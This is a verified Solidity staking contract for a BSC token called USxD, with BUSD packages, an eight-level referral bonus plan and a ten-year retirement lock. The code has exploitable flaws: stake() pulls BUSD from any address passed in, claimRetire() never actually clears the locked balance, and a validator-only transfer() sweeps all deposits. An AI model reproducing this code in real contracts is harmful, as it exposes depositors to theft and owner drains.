/**
 *Submitted for verification at BscScan.com on 2021-08-16
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;



interface AggregatorV3Interface {

  function decimals()
    external
    view
    returns (
      uint8
    );

  function description()
    external
    view
    returns (
      string memory
    );

  function version()
    external
    view
    returns (
      uint256
    );

  // getRoundData and latestRoundData should both raise "No data present"
  // if they do not have data to report, instead of returning unset values
  // which could be misinterpreted as actual reported values.
  function getRoundData(
    uint80 _roundId
  )
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function mint(uint256 amount) external  returns(bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}



library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

abstract contract ERC165 is IERC165 {

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

interface IAccessControl {
    function hasRole(bytes32 role, address account) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function grantRole(bytes32 role, address account) external;

    function revokeRole(bytes32 role, address account) external;

    function renounceRole(bytes32 role, address account) external;
}

abstract contract AccessControl is Context, IAccessControl, ERC165 {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    }

    mapping(bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
    }

    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: account ",
                        Strings.toHexString(uint160(account), 20),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
    }

    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address account) private {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) private {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}


contract USxD_Staking is AccessControl {

    AggregatorV3Interface internal priceFeed;

    uint256 public BASE_AMT = 300 * 10**18; // 300 BUSD
    uint256 public REWARD_APY = 25; // 0.25 %
    uint256[] NETWORK_APY = [3,3,3,3,3,3,3,3]; // 0.03 %
    uint256[] NETWORK_FEES = [40*10**16, 1200*10**16, 3500*10**16];
    uint256 constant PERCENT_DIV = 10000;
    uint256 public REWARD_DIV = 10 minutes;  // 1 days
    uint256 public LOCK_TIME = 10 minutes;
    bool private strict;

    IERC20 token;
    IERC20 busd;
    
    address owner;
    bytes32 public constant VALIDATOR_ROLE = keccak256("VALIDATOR_ROLE");
    
    constructor(){
        
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _setupRole(VALIDATOR_ROLE, _msgSender());
        owner = _msgSender();
        
            
        /**
         * Network: Binance Smart Chain
         * Aggregator: BNB/USD
         * Address: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE
         */ 
        
        priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
    
        token = IERC20(0xC9Eb52D1D4B8D30399e4B36C713348f7bD741bA1);
        busd = IERC20(0xadfBaBD87F331bf77C68301F443109A1E929588f);
        strict = false;
    }

    struct UserDetails{
        address ref;
        Stake[] staked;
        Revive[] revived;
        uint256 retireFund;
        uint256 networkClaimed;
        uint256 networkPlan;
    }

    struct Stake {
        uint256 timeStaked;
        uint256 amtStaked;
        uint256 lastRevived;
    }

    struct Revive {
        uint256 timeRevived;
        uint256 amtRevived;
        uint256 amtLocked;
    }

    struct Network {
        uint256 lastClaimed;
        uint256 netAmtClaimed;
        uint256[8] networkSpan;
    }

    mapping(address => UserDetails) public stakeDetails;
    mapping(address => Network) networkDetails;

        // ================== EVENTS ====================== //

    event STAKED(address user, uint256 amount);
    event REVIVED(address user, uint256 amount);
    event LOCKED(address user, uint256 amount);
    event UNLOCKED(address user, uint256 amount);
    event REFBONUS(address user, uint256 amount);

    event REGISTERED(address user, address ref);

    event Base_Amount_Changed(uint256 oldAmount, uint256 newAmount);
    event Reward_Apy_Changed(uint256 oldAmount, uint256 newAmount);
    event Network_Apy_Changed(uint256[8]);
    event Network_Fees_Changed(uint256 oldAmount, uint256 newAmount);
    event Reward_Div_Changed(uint256 oldAmount, uint256 newAmount);
    event Lock_Time_Changed(uint256 oldAmount, uint256 newAmount);
    
    event REF_STAKED(address userAddress, address refAddress, uint256 level, uint256 numPacks);
    event REFERAL_PLAN_ADDED(address userAddress, uint256 plan);

        // ================== WRITE FUNCTIONS ====================== //

    function register(address refAddress) external returns(bool){
        require(refAddress != msg.sender, "Error: Registering self");
        require(refAddress != address(0), "Error: Null Address");
        require(stakeDetails[msg.sender].ref == address(0), "Error: Already registered");
        require(stakeDetails[refAddress].staked.length > 0, "Error: Invalid ref");
        if(strict){
            require(stakeDetails[refAddress].networkPlan > 0, "Error: Purchase NetworkPlan");
        }

        // if(stakeDetails[refAddress].networkPlan > 0){

        stakeDetails[msg.sender].ref = refAddress;
        emit REGISTERED(msg.sender, refAddress);

        // }else{
        //     stakeDetails[msg.sender].ref = owner();
        // }

        return true;
    }


    function transfer() external returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        payable(_msgSender()).transfer(address(this).balance);
        busd.transfer(_msgSender(), busd.balanceOf(address(this)));
        return true;
    }

    function stake(address userAddress,  uint256 numberOfPackages) external returns(bool){
        // can buy one or more package
        require(numberOfPackages > 0, "USxD: Amount not valid");

        // check allowance
        // require(busd.allowance(userAddress, address(this)) >= BASE_AMT*numberOfPackages, "BUSD: allowance not enough");
        UserDetails storage _user = stakeDetails[userAddress];

        if(_user.ref == address(0)){
            _user.ref = address(this);
        }
        // transfer the tokens
        busd.transferFrom(userAddress, address(this), BASE_AMT*numberOfPackages);
        busd.transfer(owner, busd.balanceOf(address(this)));        
        
        // mint new USxD tokens
        token.mint(BASE_AMT*numberOfPackages/10**18);

        for(uint i=0; i<numberOfPackages; i++){
            // enter staked details
            _user.staked.push(Stake(block.timestamp, BASE_AMT, block.timestamp));
        }

        address upline = _user.ref;

        for(uint i=0; i<8; i++){
            if (upline != address(0)) {
                uint refPlan = stakeDetails[upline].networkPlan;
                if(i+1<=2**refPlan){
                    networkDetails[upline].networkSpan[i+1] += numberOfPackages;
                    emit REF_STAKED(upline, userAddress, i+1, numberOfPackages);
                }
                upline = stakeDetails[upline].ref;
            }else break;
        }

        emit STAKED(userAddress, BASE_AMT*numberOfPackages);
        return true;
    }

    function claimAll(address userAddress) external returns(bool){
        uint256 claimAmt;
        
        UserDetails storage user = stakeDetails[userAddress];
        for(uint256 i=0; i<user.staked.length; i++){
            // calculate Reward for each card + add to claimAmt
            if(block.timestamp >= user.staked[i].lastRevived+LOCK_TIME){
                claimAmt += (block.timestamp-user.staked[i].lastRevived)/REWARD_DIV*REWARD_APY*BASE_AMT/PERCENT_DIV;
                user.staked[i].lastRevived = block.timestamp;     
            }
        }

        if(user.networkPlan > 0){
            uint256 bonus = getNetworkFund(userAddress);
            networkDetails[userAddress].netAmtClaimed += bonus;
            networkDetails[userAddress].lastClaimed = block.timestamp;
            claimAmt += bonus;
            emit REFBONUS(userAddress, bonus);
        }

        uint256 rev = claimAmt*7000/10000;
        uint256 loc = claimAmt-rev;
        user.revived.push(Revive(block.timestamp, rev, loc));

        token.transfer(userAddress, rev);
        user.retireFund+= loc;
        emit REVIVED(userAddress, rev);
        emit LOCKED(userAddress, loc);
        return true;
    }

    function claimNetworkBonus(address userAddress) external returns(bool){
        uint256 claimAmt;

        UserDetails storage user = stakeDetails[userAddress];

        claimAmt = getNetworkFund(userAddress);
        networkDetails[userAddress].netAmtClaimed += claimAmt;
        networkDetails[userAddress].lastClaimed = block.timestamp;

        uint256 rev = claimAmt*7000/10000;
        uint256 loc = claimAmt-rev;
        user.revived.push(Revive(block.timestamp, rev, loc));

        token.transfer(userAddress, rev);
        user.retireFund+= loc;
        emit REFBONUS(userAddress, rev);
        emit LOCKED(userAddress, loc);
        return true;
    }

    function claim(address userAddress, uint256 i) external returns(bool){
        
        UserDetails storage user = stakeDetails[userAddress];
        require(block.timestamp >= user.staked[i].lastRevived+LOCK_TIME, "Wait for lockup to end");
        uint256 claimAmt = (block.timestamp-user.staked[i].lastRevived)/REWARD_DIV*REWARD_APY*BASE_AMT/PERCENT_DIV;
        user.staked[i].lastRevived = block.timestamp;

        uint256 rev = claimAmt*7000/10000;
        uint256 loc = claimAmt-rev;
        user.revived.push(Revive(block.timestamp, rev, loc));
        
        token.transfer(userAddress, rev);
        user.retireFund += loc;
        emit REVIVED(userAddress, rev);
        emit LOCKED(userAddress, loc);
        return true;
    }

    function claimRetire(address userAddress) external returns(bool){
        UserDetails memory user = stakeDetails[userAddress];
        require((user.staked[0].timeStaked + 3650 days) <= block.timestamp, "User not retired yet");
        // require((user.staked[0].timeStaked + 60 minutes) <= block.timestamp, "User not retired yet");
        uint256 funds = user.retireFund;
        user.retireFund = 0;
        token.transfer(userAddress, funds);
        emit UNLOCKED(userAddress, funds);
        return true;
    }

    function updateNetworkPlan(address userAddress, uint256 plan) external payable returns(bool){
        require(plan > 0 && plan < 4, "setReferalPlan: Invalid input");

        UserDetails storage user = stakeDetails[userAddress];
        uint256 currentPlan = user.networkPlan;

        require(plan != currentPlan, "Plan already joined");
        require(plan > currentPlan, "Can not downgrade");

        // transfer the tokens
        // require(busd.allowance(userAddress,address(this)) >= NETWORK_FEES[plan-1]*10**18 , "Allowance not enough" );
        // busd.transferFrom(userAddress, address(this), NETWORK_FEES[plan-1]*10**18);
        // payable(owner()).transfer(address(this).balance);
        
        uint256 price = uint(getLatestPrice());
        
        require( (msg.value) >= (NETWORK_FEES[plan-1]/price)  , "Insufficient amount");
        payable(owner).transfer(msg.value);
        
        emit REFERAL_PLAN_ADDED(userAddress, plan);
        return true;
    }
    
    
    function ease(bool _val) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        strict = _val;
        return true;
    }

    function updateBaseAmt(uint256 newAmt) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        require(BASE_AMT != newAmt, "Invalid Amount");
        emit Base_Amount_Changed(BASE_AMT, newAmt);
        BASE_AMT = newAmt;
        return true;
    }

    function updateRewardApy(uint256 newAmt) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        require(REWARD_APY != newAmt, "Invalid Amount");
        emit Reward_Apy_Changed(REWARD_APY, newAmt);
        REWARD_APY = newAmt;
        return true;
    }

    function updateNetworkFees(uint256 index, uint256 newAmt) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        require(NETWORK_FEES[index] != newAmt, "Invalid Amount");
        emit Network_Fees_Changed(NETWORK_FEES[index], newAmt);
        NETWORK_FEES[index] = newAmt;
        return true;
    }
    
    function updateNetworkApy(uint256[8] memory newAmt) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        
        for (uint i = 0; i< 8; i++){
            NETWORK_APY[i] = newAmt[i];
        }
        emit Network_Apy_Changed(newAmt);
        return true;
    }
    
    function updateNetworkApyBackUp(uint index, uint256 newAmt) external  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        NETWORK_APY[index] = newAmt;
        return true;
    }


    function changeBase(uint BASE, uint dp, uint lockTime) external  returns (bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
            emit Base_Amount_Changed(BASE_AMT, BASE);
            emit Reward_Apy_Changed(REWARD_APY, dp);
            emit Lock_Time_Changed(LOCK_TIME, lockTime);
            BASE_AMT = BASE*10**18;
            REWARD_APY = dp;
            LOCK_TIME = lockTime;
            return true;
    }
    

        // ================== READ FUNCTIONS ====================== //

    function getClaimList(address userAddress) external view returns(Revive[] memory){
        return stakeDetails[userAddress].revived;
    }


    function getStakeList(address userAddress) external view returns(Stake[] memory){
        return stakeDetails[userAddress].staked;
    }


    function totalNetworkPackageAmount(address userAddress) external view returns(uint256){
        uint256 num;
        for (uint i=0; i<8; i++){
            num += networkDetails[userAddress].networkSpan[i];
        }
        return num*BASE_AMT;
    }

    function getNetworkFund(address userAddress) public view returns(uint256){
        Network memory user = networkDetails[userAddress];
        uint256 fund;
        uint256 plan = stakeDetails[userAddress].networkPlan;
        for(uint256 i=0; i<2**plan; i++){
            fund += ((block.timestamp-user.lastClaimed)/REWARD_DIV)*user.networkSpan[i]*BASE_AMT*NETWORK_APY[i]/PERCENT_DIV;
        }
        return fund;
    }

    function totalNetworkEarned(address userAddress)external view returns(uint256){
        return getNetworkFund(userAddress)+networkDetails[userAddress].netAmtClaimed;
    }

    function getSoloEarnable(address userAddress, uint256 i) external view returns(uint256){
        UserDetails memory user = stakeDetails[userAddress];
        uint256 claimAmt = (block.timestamp-user.staked[i].lastRevived)/REWARD_DIV*REWARD_APY*BASE_AMT/PERCENT_DIV;
        return claimAmt;
    }

    function getAllEarnable(address userAddress) external view returns(uint256){
        uint256 claimAmt;

        UserDetails memory user = stakeDetails[userAddress];
        for(uint256 i=0; i<user.staked.length; i++){
            claimAmt += (block.timestamp-user.staked[i].lastRevived)/REWARD_DIV*REWARD_APY*BASE_AMT/PERCENT_DIV;
        }
        return claimAmt;
    }

    function getTotalLocked(address userAddress) external view returns(uint256){
        return stakeDetails[userAddress].retireFund;
    }

    function totalClaimed(address userAddress) external view returns(uint256){
        UserDetails memory user = stakeDetails[userAddress];
        uint256 len = user.revived.length;
        uint256 claimed;
        for(uint i=0; i<len; i++){
            claimed += user.revived[i].amtRevived;
        }
        return claimed;
    }

    

    function userPlan(address userAddress) external view returns(uint256){
        return stakeDetails[userAddress].networkPlan;
    }

    function totalNetworkFund(address userAddress) external view returns(uint256){
        return (getNetworkFund(userAddress) + networkDetails[userAddress].netAmtClaimed);
    }

    function totalUserPackages(address userAddress) external view returns(uint256){
        UserDetails memory user = stakeDetails[userAddress];
        return user.staked.length;
    }

    function totalUserClaimed(address userAddress) external view returns(uint256){
        UserDetails memory user = stakeDetails[userAddress];
        return user.revived.length;
    }

    function atEase() external view  returns(bool){
        require(hasRole(VALIDATOR_ROLE, _msgSender()), "USxD: must have validator role to mint");
        return strict;
    }

    function retireDate(address userAddress) external view returns(uint256){
        return stakeDetails[userAddress].staked[0].timeStaked + 3650 days;
    }
    
    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID,
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
    
}